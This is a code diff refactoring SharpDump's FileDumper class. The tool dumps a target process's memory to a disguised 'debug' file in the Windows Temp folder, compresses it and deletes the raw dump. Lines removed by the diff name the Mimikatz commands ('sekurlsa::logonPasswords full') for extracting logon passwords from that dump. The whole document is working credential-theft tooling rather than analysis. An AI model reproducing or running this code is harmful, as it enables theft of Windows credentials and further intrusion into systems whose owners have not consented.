@@ -2,11 +2,16 @@
 using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
+using SharpDump.Interfeces;
 
 namespace SharpDump
 {
     public class FileDumper
     {
+        private readonly IFileCompressor _fileCompressor = new FileCompressor();
+        private readonly IWorkingWithFile _workingWithFile = new WorkingWithFile();
+        private readonly IMessages _messages = new Messages();
+        
         // partially adapted from https://blogs.msdn.microsoft.com/dondu/2010/10/24/writing-minidumps-in-c/
 
         // Overload supporting MiniDumpExceptionInformation == NULL
@@ -26,7 +31,7 @@ namespace SharpDump
             IntPtr userStreamParam, 
             IntPtr callbackParam);
 
-        public static void MiniDump(int pid = -1)
+        public void MiniDump(int pid = -1)
         {
             IntPtr targetProcessHandle = IntPtr.Zero;
             uint targetProcessId = 0;
@@ -68,10 +73,10 @@ namespace SharpDump
             bool bRet = false;
 
             string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
-            string dumpFile = String.Format("{0}\\Temp\\debug{1}.out", systemRoot, targetProcessId);
-            string zipFile = String.Format("{0}\\Temp\\debug{1}.bin", systemRoot, targetProcessId);
+            string dumpFile = $"{systemRoot}\\Temp\\debug{targetProcessId}.out";
+            string zipFile = $"{systemRoot}\\Temp\\debug{targetProcessId}.bin";
 
-            Console.WriteLine(String.Format("\n[*] Dumping {0} ({1}) to {2}", targetProcess.ProcessName, targetProcess.Id, dumpFile));
+            Console.WriteLine(_messages.DumpingTargetProcessToDumpFile(targetProcess, dumpFile));
 
             using (FileStream fs = new FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
             {
@@ -89,32 +94,28 @@ namespace SharpDump
             }
         }
 
-        public static void FileProcessing(string dumpFile, string zipFile, uint targetProcessId,int pid)
+
+        public void FileProcessing(string dumpFile, string zipFile, uint targetProcessId,int pid)
         {
-            Console.WriteLine("[+] Dump successful!");
-            Console.WriteLine(String.Format("\n[*] Compressing {0} to {1} gzip file", dumpFile, zipFile));
+            Console.WriteLine(_messages.DumpSuccessfulAndCompressing(dumpFile,zipFile));
+            _fileCompressor.Compress(dumpFile, zipFile);
 
-            FileCompressor.Compress(dumpFile, zipFile);
-
-            Console.WriteLine(String.Format("[*] Deleting {0}", dumpFile));
-            File.Delete(dumpFile);
-            Console.WriteLine("\n[+] Dumping completed. Rename file to \"debug{0}.gz\" to decompress.", targetProcessId);
+            Console.WriteLine(_messages.Deleting(dumpFile));
+            _workingWithFile.FileDelete(dumpFile);
+            Console.WriteLine(_messages.DumpingCompleted(targetProcessId));
 
             string arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
             string OS = "";
             var regKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion");
             if (regKey != null)
             {
-                OS = String.Format("{0}", regKey.GetValue("ProductName"));
+                OS = $"{regKey.GetValue("ProductName")}";
             }
 
             if (pid == -1)
             {
-                Console.WriteLine(String.Format("\n[*] Operating System : {0}", OS));
-                Console.WriteLine(String.Format("[*] Architecture     : {0}", arch));
-                Console.WriteLine(String.Format("[*] Use \"sekurlsa::minidump debug.out\" \"sekurlsa::logonPasswords full\" on the same OS/arch\n", arch));
+                Console.WriteLine(_messages.OperatingSystemAndArchitecture(OS, arch));
             }
         }
-
     }
 }
